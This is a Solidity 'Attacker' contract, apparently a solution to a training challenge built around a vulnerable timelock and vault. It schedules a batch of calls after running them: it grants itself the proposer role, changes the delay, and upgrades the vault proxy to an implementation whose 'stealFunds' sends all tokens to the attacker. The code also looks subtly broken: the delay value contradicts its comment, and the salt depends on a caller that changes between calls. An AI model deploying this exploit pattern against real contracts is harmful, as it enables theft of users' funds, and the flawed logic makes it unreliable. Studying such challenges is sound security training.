pragma solidity 0.8.12;

import {ClimberVaultV2} from "./ClimberVaultV2.sol";
import {ClimberTimelock} from "./ClimberTimelock.sol";

contract Attacker {
    ClimberVaultV2 internal climberImplementation2;
    ClimberTimelock internal climberTimelock;

    address internal attacker;
    address internal climberVaultProxy;
    address internal dvt;

    constructor(
        address payable climbertimelock,
        address climberVaultProxy_,
        address attacker_,
        address dvt_
    ) {
        climberImplementation2 = new ClimberVaultV2();
        climberTimelock = ClimberTimelock(climbertimelock);
        attacker = attacker_;
        climberVaultProxy = climberVaultProxy_;
        dvt = dvt_;
    }

    function buildAttack()
        internal
        view
        returns (address[] memory, uint256[] memory, bytes[] memory, bytes32)
    {
        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, msg.sender));

        address[] memory targets = new address[](5);
        targets[0] = address(climberTimelock); // set delay to 0
        targets[1] = address(climberTimelock); // set address(this) as proposer
        targets[2] = address(this); // schedule an upgrade and call
        targets[3] = address(climberVaultProxy);
        targets[4] = address(address(this));

        uint256[] memory values = new uint256[](5);
        values[0] = uint256(0);
        values[1] = uint256(0);
        values[2] = uint256(0);
        values[3] = uint256(0);
        values[4] = uint256(0);

        bytes[] memory datas = new bytes[](5);
        datas[0] = abi.encodeWithSignature("updateDelay(uint64)", 1);

        datas[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            climberTimelock.PROPOSER_ROLE(),
            address(this)
        );

        datas[2] = abi.encodeWithSignature("scheduleAttack()");

        bytes memory data = abi.encodeWithSignature(
            "stealFunds(address,address)",
            address(dvt),
            attacker
        );
        datas[3] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(climberImplementation2),
            data
        );

        datas[4] = abi.encodeWithSignature(
            "attack()"
        );

        return (targets, values, datas, salt);
    }

    function attack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory datas,
            bytes32 salt
        ) = buildAttack();
        climberTimelock.execute(targets, values, datas, salt);
    }

    function executeAttack(address[] memory, uint256[] memory, bytes[] memory, bytes32) external {

    }

    function scheduleAttack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory datas,
            bytes32 salt
        ) = buildAttack();
        climberTimelock.schedule(targets, values, datas, salt);
    }
}
